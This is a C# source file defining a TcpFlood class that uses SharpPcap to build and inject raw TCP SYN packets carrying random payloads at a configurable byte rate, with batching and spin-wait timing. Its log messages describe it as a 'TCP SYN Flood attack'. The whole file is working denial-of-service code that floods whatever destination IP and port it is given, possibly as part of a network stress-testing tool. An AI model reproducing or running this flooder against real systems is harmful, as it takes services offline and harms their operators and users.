using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,  // SYN flag
                    WindowSize = 8192,
                    SequenceNumber = 0,
                    PayloadData = new byte[1400]
                };

                random.NextBytes(tcpPacket.PayloadData);
                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                int totalPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 1000; // Increased batch size
                long packetsPerSecond = _params.BytesPerSecond / totalPacketSize;
                double microsecondsPerBatch = (1_000_000.0 * batchSize) / packetsPerSecond;

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];
                    var packetPool = new byte[batchSize][];

                    // Pre-generate packet pool
                    for (int i = 0; i < batchSize; i++)
                    {
                        random.NextBytes(bytes);
                        tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        packetPool[i] = ethernetPacket.Bytes;
                    }

                    var packetSize = totalPacketSize;
                    var packetsPerSecond = _params.BytesPerSecond / packetSize;
                    var microBatchSize = 100;
                    var microBatchDelay = TimeSpan.FromSeconds(1.0 * microBatchSize / packetsPerSecond);
                    var currentBatch = 0;

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();

                            // Send micro-batch of packets
                            for (int i = 0; i < microBatchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                injectionDevice.SendPacket(packetPool[currentBatch * microBatchSize + i]);
                            }

                            currentBatch++;
                            
                            // Regenerate packet pool when needed
                            if (currentBatch >= batchSize / microBatchSize)
                            {
                                for (int i = 0; i < batchSize; i++)
                                {
                                    random.NextBytes(bytes);
                                    tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                                    tcpPacket.UpdateCalculatedValues();
                                    ipPacket.UpdateCalculatedValues();
                                    packetPool[i] = ethernetPacket.Bytes;
                                }
                                currentBatch = 0;
                            }

                            // High precision rate limiting
                            var elapsedMicros = stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency;
                            var targetMicros = (long)(microBatchDelay.TotalSeconds * 1_000_000);
                            
                            if (elapsedMicros < targetMicros)
                            {
                                var remainingMicros = targetMicros - elapsedMicros;
                                if (remainingMicros > 1000)
                                {
                                    Thread.Sleep((int)(remainingMicros / 1000));
                                }
                                // Spin wait for sub-millisecond precision
                                while (stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency < targetMicros)
                                {
                                    Thread.SpinWait(1);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}